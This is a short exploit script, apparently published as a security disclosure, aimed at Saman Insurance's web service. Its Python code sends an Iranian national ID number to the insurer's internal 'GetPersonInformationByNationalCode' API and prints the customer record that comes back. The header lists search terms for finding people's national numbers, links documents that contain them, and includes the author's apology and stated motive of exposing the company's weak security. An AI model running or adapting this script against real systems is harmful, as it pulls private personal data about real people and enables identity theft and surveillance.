# Exploit Title: Saman Travel Insurance (Maybe Saman Insurance) Customers Identification with Iranian National Number
# Company URL: ['https://samandirect.ir/','http://www.si24.ir/']
# Google Dork [Iranian National Number] : ['کارت ملی','شماره ملی','Cart Meli','Shomare Meli']
# Date: [date]
# Exploit Author: ['Sharax']
# Vendor Page: https://github.com/sharaxco/SecurityReport
# Version: (1.0)
# Tested on: ['Python 3.6','All OS']
#
#
#
#	Comment Example : python3.6 SamanInsurance.py 1234567890
#
#	Iranian National Number Example: ['http://iraninsurance.ir/documents/10623/223299/552nf.pdf',
#									'http://med.mui.ac.ir/sites/default/files/users/ofony/nomarat%2096_1_2.PDF']
#
#
#	Hi
#	درود
#	This is not an act against the people of my country
#	این اقدام علیه مردم کشور من نیست
#	This reflects the lack of knowledge of some of the major Iranian companies.
#	این نشان دهنده کمبود دانش برخی از شرکت های بزرگ ایرانی است.
#	I apologize to the Iranian people
#	من از مردم ایران عذرخواهی می کنم
#	But these measures are needed
#	اما این اقدامات مورد نیاز است

import urllib.request
import json
import sys

myurl = "https://samandirect.ir/api/internal/UIWebApis/GetPersonInformationByNationalCode"
req = urllib.request.Request(myurl)
req.add_header('Content-Type', 'application/json; charset=utf-8')
jsondata = json.dumps({'NationalCodes': [int(sys.argv[1])]})
jsondataasbytes = jsondata.encode('utf-8')
response = urllib.request.urlopen(req, jsondataasbytes)
print(response.read())
